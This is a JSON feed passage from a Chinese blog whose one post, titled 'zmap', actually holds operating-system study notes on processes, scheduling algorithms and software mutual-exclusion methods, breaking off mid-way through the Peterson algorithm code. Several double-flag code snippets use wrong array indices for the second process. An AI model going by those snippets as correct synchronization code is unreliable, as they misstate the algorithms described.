{
    "version": "https://jsonfeed.org/version/1",
    "title": "岁余的博客",
    "description": "welcome",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/07/15/zmap/",
            "url": "http://example.com/2023/07/15/zmap/",
            "title": "zmap",
            "date_published": "2023-07-15T06:48:00.000Z",
            "content_html": "<h1 id=\"操作系统\"><a class=\"markdownIt-Anchor\" href=\"#操作系统\">#</a> 操作系统</h1>\n<h3 id=\"11_1-操作系统的概念-功能和目标\"><a class=\"markdownIt-Anchor\" href=\"#11_1-操作系统的概念-功能和目标\">#</a> 1.1_1 操作系统的概念、功能和目标</h3>\n<p>作为用户和<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTglQUUlQTElRTclQUUlOTclRTYlOUMlQkElRTclQTElQUMlRTQlQkIlQjYmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">计算机硬件</span>之间的接口</p>\n<ul>\n<li>提供的功能\n<ul>\n<li>命令接口（联机命令接口 | 脱机命令接口）</li>\n<li>程序接口</li>\n<li>GUI（图形用户界面 win|ios|andrio）</li>\n</ul>\n</li>\n<li>目标\n<ul>\n<li>方便用户使用</li>\n</ul>\n</li>\n</ul>\n<p><img data-src=\"F:/Typora%E6%88%AA%E5%9B%BE/ccdb31948c9e730f27c0b2a4ff899ec0.png\" alt=\"img\"></p>\n<h3 id=\"11_2-操作系统的特征\"><a class=\"markdownIt-Anchor\" href=\"#11_2-操作系统的特征\">#</a> 1.1_2 操作系统的特征</h3>\n<p>并发 | 并行</p>\n<p>并发：多个事件交替发生（宏观同时发生、微观交替进行）<br>\n并行：多个事件同时发生</p>\n<p>共享</p>\n<p>两种资源共享方式</p>\n<ul>\n<li>互斥共享方式：一个时间段内只允许一个进程访问该资源</li>\n<li>同时共享方式：允许一个时间段内由多个进程 “同时” 对它们进行访问</li>\n</ul>\n<p>并发和共享是多用户 os 的两个最基本的特征</p>\n<p>虚拟</p>\n<p>概念：把一个物理上的实体变为若干个逻辑上的对应物</p>\n<ul>\n<li>空分复用计数</li>\n<li>时分复用计数</li>\n</ul>\n<p>异步</p>\n<p>概念：在多道程序环境下，允许多个程序并发执行，但由于资源有限，进程的执行不是一贯到底的，而是走走停停的，以不可预知的速度向前推进。只有系统拥有并发性，才有可能导致异步性。</p>\n<h3 id=\"11_3-操作系统的发展与分类\"><a class=\"markdownIt-Anchor\" href=\"#11_3-操作系统的发展与分类\">#</a> 1.1_3 操作系统的发展与分类</h3>\n<p>OS 的发展与分类</p>\n<ul>\n<li>手工操作阶段\n<ul>\n<li>纸带机（用户独占全机、人机速度矛盾）</li>\n</ul>\n</li>\n<li>批处理阶段 ——dan’dao\n<ul>\n<li>单道批处理系统（外围机 —— 磁带）</li>\n<li>多道批处理系统（操作系统开始出现）</li>\n</ul>\n</li>\n<li>分时操作系统\n<ul>\n<li>轮流处理作业</li>\n<li>不能处理紧急任务</li>\n</ul>\n</li>\n<li>实时操作系统\n<ul>\n<li>优先处理紧急任务</li>\n<li>硬实时系统：必须在严格的时间内完成处理</li>\n<li>软实时系统：可以偶尔犯错</li>\n</ul>\n</li>\n<li>网络操作系统</li>\n<li>分布式操作系统</li>\n<li>个人计算机操作系统</li>\n</ul>\n<h3 id=\"11_4-操作系统的运行机制与体系结构\"><a class=\"markdownIt-Anchor\" href=\"#11_4-操作系统的运行机制与体系结构\">#</a> 1.1_4 操作系统的运行机制与体系结构</h3>\n<p>OS 的运行机制和体系结构</p>\n<ul>\n<li>运行机制\n<ul>\n<li>两种指令\n<ul>\n<li>特权指令</li>\n<li>非特权指令</li>\n</ul>\n</li>\n<li>两种处理器状态\n<ul>\n<li>核心态（root）</li>\n<li>用户态</li>\n</ul>\n</li>\n<li>两种程序\n<ul>\n<li>内核程序 (运行在核心态)</li>\n<li>应用程序</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>操作系统内核\n<ul>\n<li>时钟管理（实现计时功能）</li>\n<li>中断处理</li>\n<li>原语（程序运行具有原子性，不可中断）</li>\n<li>对系统资源进行管理的功能\n<ul>\n<li>进程管理</li>\n<li>存储器管理</li>\n<li>设备管理</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>操作系统的体系结构\n<ul>\n<li>大内核（将操作系统的主要功能模块都作为系统内核，运行在核心态）</li>\n<li>微内核（只把最基本的功能保留在内核）</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"11_5-中断和异常\"><a class=\"markdownIt-Anchor\" href=\"#11_5-中断和异常\">#</a> 1.1_5 中断和异常</h3>\n<ul>\n<li>中断机制的诞生\n<ul>\n<li>操作系统介入，开展管理工作</li>\n<li>“用户态 —&gt; 核心态” 是通过中断实现的。并且中断是唯一途径</li>\n</ul>\n</li>\n<li>中断的概念和作用</li>\n<li>中断的分类\n<ul>\n<li>内中断（异常）\n<ul>\n<li>陷阱（trap）</li>\n<li>故障（fault）</li>\n<li>中止（abort）</li>\n</ul>\n</li>\n<li>外中断 （CPU 外部）</li>\n</ul>\n</li>\n<li>外中断的处理过程</li>\n</ul>\n<h3 id=\"11_6-系统调用\"><a class=\"markdownIt-Anchor\" href=\"#11_6-系统调用\">#</a> 1.1_6 系统调用</h3>\n<p>概念：应用程序通过系统调用请求操作系统的服务。保证系统的稳定性和安全性。</p>\n<p>系统调用和库函数的区别：</p>\n<ul>\n<li>系统调用是操作系统向上层提供的接口</li>\n<li>有的库函数是对系统调用的进一步封装</li>\n<li>当今编写的应用程序大多是通过高级语言提供的库函数间接地进行系统调用</li>\n</ul>\n<h3 id=\"21_1-进程的定义-组成-组织方式-特征\"><a class=\"markdownIt-Anchor\" href=\"#21_1-进程的定义-组成-组织方式-特征\">#</a> 2.1_1 进程的定义、组成、组织方式、特征</h3>\n<p>定义：</p>\n<p>组成：PCB（进程存在唯一的标志），程序段，数据段</p>\n<p>组织方式：链接方式，指针指向不同的队列；索引方式，索引表</p>\n<p>特征：动态性、并发性、独立性、异步性、结构性</p>\n<h3 id=\"21_2-进程的状态与转换\"><a class=\"markdownIt-Anchor\" href=\"#21_2-进程的状态与转换\">#</a> 2.1_2 进程的状态与转换</h3>\n<p>状态：</p>\n<p>运行状态：占有 CPU，并在 CPU 上运行，单核只能一个进程（双核两个）（CPU√，其它资源√）</p>\n<p>就绪状态：已经具备运行条件，但是没有空闲的 CPU，暂时不能运行（CPUX，其它资源√）</p>\n<p>阻塞状态：等在某个事件的发生，暂时不能运行（CPUX，其它资源 X）</p>\n<p>创建状态：创建 PCB，程序段，数据段</p>\n<p>终止状态：回收内存，程序段，数据段，撤销 PCB</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTglQkYlOUIlRTclQTglOEIlRTclOEElQjYlRTYlODAlODEmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">进程状态</span>间的转换 (图，且只能这样转化)</p>\n<p>创建态 -&gt; 就绪态</p>\n<p>就绪态 -&gt; 运行态</p>\n<p>运行态 -&gt; 就绪态</p>\n<p>运行态 -&gt; 中止态（比如数组越界）</p>\n<p>运行态 -&gt; 阻塞态（主动）</p>\n<p>阻塞态 -&gt; 就绪态（被动）</p>\n<h3 id=\"21_3-进程控制\"><a class=\"markdownIt-Anchor\" href=\"#21_3-进程控制\">#</a> 2.1_3 进程控制</h3>\n<p>基本概念：</p>\n<p>什么是进程控制？</p>\n<p>答：实现各种进程状态转换。</p>\n<p>如何实现进程控制？</p>\n<p>答：用 “原语” 实现。</p>\n<p>原语做的事情：</p>\n<p>1、更新 PCD 中的信息</p>\n<p>2、将 PCD 插入合适的队列</p>\n<p>3、分配 / 回收资源</p>\n<p><strong>进程控制相关的原语：</strong></p>\n<p>1、进程的创建：</p>\n<p>创建原语：申请空白 PCB、为新进程分配所需资源、初始化 PCB、将 PCB 插入就绪队列</p>\n<p>引起进程创建的事件：用户登录、作业调度、提供服务、应用请求</p>\n<p>2、进程的终止：</p>\n<p>撤销原语</p>\n<p>引起进程中止的事件：正常结束、异常结束、外界干预</p>\n<p>3、进程的阻塞：</p>\n<p>阻塞原语：运行态 -&gt; 阻塞态</p>\n<p>引起进程阻塞的事件：需要等待系统分配某种资源、需要等待相互合作的其他进程完成工作</p>\n<p>4、进程的唤醒：</p>\n<p>唤醒原语：阻塞态 -&gt; 就绪态</p>\n<p>引起进程唤醒的事件：等待的事件发生</p>\n<p>5、进程的切换</p>\n<p>切换原语</p>\n<p>引起进程切换的事件：当前进程事件片到、有更高优先级的进程到达、当前进程主动阻塞、当前进程终止</p>\n<h3 id=\"21_4-进程通信\"><a class=\"markdownIt-Anchor\" href=\"#21_4-进程通信\">#</a> 2.1_4 进程通信</h3>\n<p>1、共享存储 （分配共享空间，且互斥（P、V 操作）</p>\n<p>基于数据结构的共享：固定分配（低级）</p>\n<p>基于存储区的共享：划分存储区（高级）</p>\n<p>2、消息传递</p>\n<p>消息：消息头、消息体</p>\n<p>直接通信方式（直接挂载消息）</p>\n<p>间接通信方式（间接利用信箱发送消息）</p>\n<p>3、管道通信（pipe）</p>\n<p>只能半双工通信</p>\n<p>互斥（没写满，不能读，反之同理）</p>\n<h3 id=\"21_5-线程概念和多线程模型\"><a class=\"markdownIt-Anchor\" href=\"#21_5-线程概念和多线程模型\">#</a> 2.1_5 线程概念和多线程模型</h3>\n<p>什么是线程，为什么要引入线程？</p>\n<p>答：线程是一个基本的 CPU 执行单元，也是程序执行流的最小单位，进一步提高了系统的并发度</p>\n<p>引入线程机制后，有什么变化？</p>\n<p>资源分配、调度：进程是资源分配的基本单位，线程是调度的基本单位</p>\n<p>并发性：各线程间也能并发，提升了并发度</p>\n<p>系统开销：可以只在进程中切换，减小了 CPU 切换环境的系统开销</p>\n<p>1、线程有哪些重要的属性</p>\n<ul>\n<li>线程是处理机调度的基本单位</li>\n<li>多 CPU 计算机中，各个线程可占用不同的 CPU</li>\n<li>每个线程都有一个线程 ID、线程控制块（TCB）</li>\n<li>线程也有就绪、阻塞、运行三种基本状态</li>\n<li>线程几乎不拥有系统资源</li>\n<li>同一进程的不同线程间共享进程的资源</li>\n<li>由于共享内存地址空间，统一进程中的线程间通信甚至无需系统干预</li>\n<li>同一进程中的线程切换，不会引起进程切换</li>\n<li>不同进程中的线程切换，会引起进程切换</li>\n<li>切换同进程内的线程，系统开销很小</li>\n<li>切换进程，系统开销较大</li>\n</ul>\n<p>2、线程的实现方式</p>\n<p>用户级线程（ULT）：</p>\n<p>由应用管理，从用户的视角看能看到的线程</p>\n<p>内核级线程（KLT）：</p>\n<p>由操作系统管理，从操作系统内核视角看能看到的线程</p>\n<p>n 个 ULT 可以映射到 m 个 KLT 上（n&gt;=m）</p>\n<p>内核级线程才是处理机分配的单位</p>\n<p>3、多线程模型</p>\n<p>多对一模型</p>\n<p>n 个 ULT 映射到 1 个 KLT</p>\n<p>优点：开销小，效率高</p>\n<p>缺点： 容易阻塞，并发度不高</p>\n<p>一对一模型</p>\n<p>n 个 ULT 映射到 n 个 KLT</p>\n<p>优点：并发能力很强</p>\n<p>缺点：占用成本高，开销大</p>\n<p>多对多模型</p>\n<p>n 个 ULT 映射到 m 个 KLT 上（n&gt;=m）</p>\n<p>中和以上两种优缺点</p>\n<h3 id=\"22_1-处理机调度的概念-层次\"><a class=\"markdownIt-Anchor\" href=\"#22_1-处理机调度的概念-层次\">#</a> 2.2_1 处理机调度的概念、层次</h3>\n<p>基本概念</p>\n<p>通常进程数量大于处理机数量，所以要按照一定的算法选择一个进程，并将处理机分配给它运行，以实现进程的并发执行</p>\n<p>三个层次</p>\n<p>高级调度（作业调度）</p>\n<p>辅助外存与内存之间的调度，作业调入时会建立相应的 PCB，作业调出时才撤销 PCB，调入可由操作系统决定，调出由作业运行结束才调出</p>\n<p>中级调度（内存调度）</p>\n<p>将暂时不用的进程放到外存（PCB 不外放），提高内存利用率和系统吞吐量，进程状态为挂起状态，形成挂起队列</p>\n<p>低级调度（进程调度）</p>\n<p>最基本，用算法为进程分配处理机资源，几十 ms 一次</p>\n<p>三层调度的联系、对比</p>\n<p>进程的 “挂起态”</p>\n<p>七状态模型</p>\n<p>五状态前面学了，挂起分为就绪挂起、阻塞挂起</p>\n<p><img data-src=\"F:/Typora%E6%88%AA%E5%9B%BE/6ea9441c9d17d1d23c2ce2d000f7658b.png\" alt=\"img\"></p>\n<h3 id=\"22_2-进程调度的时机-切换与过程调度方式\"><a class=\"markdownIt-Anchor\" href=\"#22_2-进程调度的时机-切换与过程调度方式\">#</a> 2.2_2 进程调度的时机、切换与过程调度方式</h3>\n<p>1、时机</p>\n<p>什么时候需要进程调度？</p>\n<ul>\n<li>主动放弃（进程正常终止、运行过程中发生异常而终止、进程主动请求阻塞）</li>\n<li>被动放弃（分给进程的时间片用完、有更紧急的事需要处理、有更高优先级的进程进入就绪队列）</li>\n</ul>\n<p>什么时候不能进行进程调度？</p>\n<ul>\n<li>在处理中断的过程中</li>\n<li>在操作系统内核程序临界区中\n<ul>\n<li>临界资源：一个时段段内各进程互斥地访问临界资源</li>\n<li>临界区：访问临界资源的那段代码</li>\n<li>内核程序临界区会访问就绪队列，导致其上锁</li>\n</ul>\n</li>\n<li>在原子操作过程中（原语）</li>\n</ul>\n<p>2、切换与过程</p>\n<p>“狭义的调度” 与 “进程切换” 的区别</p>\n<ul>\n<li>狭义：选择一个进程</li>\n<li>广义：狭义 + 进程切换</li>\n</ul>\n<p>进程切换的过程需要做什么？</p>\n<ul>\n<li>对原来运行进程各种数据的保存</li>\n<li>对新的进程各种数据的恢复</li>\n</ul>\n<p>3、方式</p>\n<p>非剥夺调度方式（非抢占式）</p>\n<ul>\n<li>只允许进程主动放弃处理机</li>\n</ul>\n<p>剥夺调度方式（抢占式）</p>\n<ul>\n<li>进程被动放弃，可以优先处理紧急任务，适合分时操作系统、实时操作系统</li>\n</ul>\n<h3 id=\"22_3-调度算法的评价指标\"><a class=\"markdownIt-Anchor\" href=\"#22_3-调度算法的评价指标\">#</a> 2.2_3 调度算法的评价指标</h3>\n<p>1、CPU 利用率</p>\n<p>CPU 利用率 = CPU 忙碌的时间 / 总时间</p>\n<p>2、系统吞吐量</p>\n<p>= 总共完成了多少道作业 / 总共画了多少时间</p>\n<p>3、周转时间</p>\n<ul>\n<li>周转时间（提交作业到完成作业花费的时间）、平均周转时间（各作业周转时间之和 / 作业数）</li>\n<li>带权周转时间（作业周转时间 / 作业实际运行的时间）、平均带权周转时间（各作业带权周转时间 / 作业数）</li>\n</ul>\n<p>4、等待时间</p>\n<p>进程或作业等待处理机状态时间的和</p>\n<p>进程：等待被服务的时间之和</p>\n<p>作业：建立后的等待时间 + 作业在外存后备队列中等待的时间</p>\n<p>5、响应时间</p>\n<p>从用户提交请求到首次产生响应所用的时间</p>\n<h3 id=\"22_4-fcfs-sjf-hrrn调度算法\"><a class=\"markdownIt-Anchor\" href=\"#22_4-fcfs-sjf-hrrn调度算法\">#</a> 2.2_4 FCFS、SJF、HRRN 调度算法</h3>\n<p>1、先来先服务（FCFS）</p>\n<p>先到达先进行服务</p>\n<p>作业 - 后备队列；进程 - 就绪队列</p>\n<p>非抢占式</p>\n<p>公平、算法简单</p>\n<p>对长作业有利、对短作业不利、不会饥饿</p>\n<p>2、短作业优先（SJF，shortest job first）</p>\n<p>最短（服务时间最短）的作业优先得到服务，时间相同，先到达的先被服务</p>\n<p>非抢占式（SJF）：选最短需要时间的作业先进入运行态</p>\n<p>抢占式（SRTN）：有新作业进入就绪队列或有作业完成了，考察队列中的最小需要时间的作业</p>\n<p>在所有进程都几乎同时到达时，采用 SJP 调度算法的平均等待时间、平均周转时间最少</p>\n<p>若无红色前提，抢占式的短作业 / 进程的平均时间最少</p>\n<p>优点：“最短的” 平均等待时间，平均周转时间</p>\n<p>缺点：对短作业有利，对长作业不利，可能产生饥饿现象</p>\n<p>3、高响应比优先（HRRN）</p>\n<p>要综合考虑作业 / 进程的等待时间和要求服务的时间</p>\n<p>在每次调度时先计算各个作业 / 进程的响应比，选择响应比最高的作业 / 进程为其服务</p>\n<p>响应比 =（等待时间 + 要求服务时间）/ 要求服务时间</p>\n<p>非抢占式</p>\n<p>进程主动放弃 CPU 时，需要该算法选取就绪队列的作业</p>\n<p>不会饥饿</p>\n<h3 id=\"22_5-时间片轮转-优先级调度-多级反馈队列适合交互式系统\"><a class=\"markdownIt-Anchor\" href=\"#22_5-时间片轮转-优先级调度-多级反馈队列适合交互式系统\">#</a> 2.2_5 时间片轮转、优先级调度、多级反馈队列（适合交互式系统）</h3>\n<p>1、时间片轮转算法（RR）</p>\n<p>算法思想：公平轮流地位各个进程服务，让每个进程在一定时间间隔内都可以得到响应</p>\n<p>算法规则：按照各进程到达就绪队列的顺序，轮流让各个进程执行一个时间片（如 100ms）。若进程未在一个时间片内执行完，则剥夺处理机，将进程重新放到就绪队列对位重新排队。</p>\n<p>只能用于进程调度</p>\n<p>抢占式</p>\n<p>优点：响应块，适用于分时操作系统</p>\n<p>缺点：由于高频率的进程切换，因此有一定的开销；不区分任务的紧急程度</p>\n<p>不会饥饿</p>\n<p>2、优先级调度算法</p>\n<p>算法思想：根据任务的紧急程度来决定处理顺序</p>\n<p>算法规则：每个进程 / 作业有各自的优先级，调度时选择优先级最高的作业 / 进程</p>\n<p>适用：作业 / 进程 / IO</p>\n<p>抢占式 / 不可抢占均有</p>\n<p>静态优先级：不变</p>\n<p>动态优先级：可以变</p>\n<p>通常：系统进程优先级高于用户进程，前台进程优先级高于后台进程，操作系统更偏好 I/O 进程</p>\n<p>可以从追求公平、提升资源利用率等角度考虑改变优先级</p>\n<p>可能会饥饿</p>\n<p>3、多级反馈队列调度算法</p>\n<p>算法思想：对其它算法调度的这种权衡</p>\n<p>算法实现：设置多级就绪队列，各级队列优先级从高到低，时间片从小到大。新进程到达时先进入第一级队列，按照 FCFS 原则排队等待被分配时间片。若用完时间片进程还未结束，则进程进入下一级队列对位。如果此时已经在最下级的队列，则重新放回最下级队列末尾。啊只有第 K 级队头的进程为空时，才会为 K+1 级对头的进程分配时间片，被抢占处理机的进程重新放回原队列队尾。</p>\n<p><img data-src=\"F:/Typora%E6%88%AA%E5%9B%BE/e3511c2bee7ff94bf8fe9c0fae2806eb.png\" alt=\"img\"></p>\n<p>优点：对各个进程相对公平（FCFS 的优点），每个新到达的进程都可以很快就得到响应（RR 的优点）；短进程只用较少的时间就可以完成（SPF 的优点）；不必实现估计进程的运行时间（避免用户作假）；可灵活地调整对各类进程的偏好程度，比如 CPU 密集型进程、IO 密集型进程</p>\n<p>默认抢占式</p>\n<p>会饥饿</p>\n<h3 id=\"23_1-进程同步-进程互斥\"><a class=\"markdownIt-Anchor\" href=\"#23_1-进程同步-进程互斥\">#</a> 2.3_1 进程同步、进程互斥</h3>\n<p>1、进程同步</p>\n<p>指为了完成某种任务而建立的两个或多个进程，这些进程因为需要在某些位置上协调他们的工作次序而产生的制约关系。进程间的直接制约关系就是源于它们之间的相互合作。</p>\n<p>2、进程互斥</p>\n<p>把一个时间段内只允许一个进程使用的资源称为临界资源。</p>\n<p>对临界资源的互斥访问，可以在逻辑上分为四个部分：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">do</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    entry section<span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 进入区     对访问的资源检查或进行上锁</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    critical section<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 临界区 (段) 访问临界资源的那部分代码</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    exit section<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 退出区     负责解锁</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    remainder section<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 剩余区     其它处理</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">123456</span></pre></td></tr></table></figure><p>1、空闲让进。 空的可以直接进去</p>\n<p>2、忙则等待。 繁忙不能进去</p>\n<p>3、有限等待。 不能让进程等待无限长时间</p>\n<p>4、让权等待。 不能进去，不要堵着</p>\n<h3 id=\"23_2-进程互斥的软件实现方法\"><a class=\"markdownIt-Anchor\" href=\"#23_2-进程互斥的软件实现方法\">#</a> 2.3_2 进程互斥的软件实现方法</h3>\n<p>1、单标志法</p>\n<p>两个进程在访问完临界区后会把使用临界区的权限教给另一个进程。也就是说每个进程进入临界区的权限只能被另一个进程赋予</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> turn <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//p0 进程</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>turn<span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>critical section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>turn <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>remainder section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//p1 进程</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>turn<span class=\"token operator\">!=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>critical section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>turn <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>remainder section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">1234567891011</span></pre></td></tr></table></figure><p>可以实现互斥</p>\n<p>存在的问题：p1 要访问的话，必须 p0 先访问，违背：空闲让进原则</p>\n<p>2、双标志先检查</p>\n<p>算法思想：设置一个 bool 数组 flag [] 来标记自己是否想要进入临界区的意愿</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">bool</span> flag<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//p1 进程</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>critical section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>flag<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>remainder section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">//p2 进程</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>flag<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>critical section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>flag<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>remainder section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token number\">12345678910111213</span></pre></td></tr></table></figure><p>主要问题：由于进程是并发进行的，可能会违背忙则等待的原则</p>\n<p>3、双标志后检查</p>\n<p>算法思想：设置一个 bool 数组 flag [] 来标记自己是否想要进入临界区的意愿，不过是先上锁后检查</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">bool</span> flag<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//p1 进程</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>critical section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>flag<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>remainder section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">//p2 进程</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>flag<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>critical section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>flag<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>remainder section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token number\">12345678910111213</span></pre></td></tr></table></figure><p>主要问题：由于进程是并发进行的，可能会两个同时上锁，都进不去，违反空闲让进和有限等待原则</p>\n<p>会饥饿</p>\n<p>4、Peterson 算法</p>\n<p>主动让对方先使用处理器</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">bool</span> flag<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> turn<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//p1 进程</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>turn<span 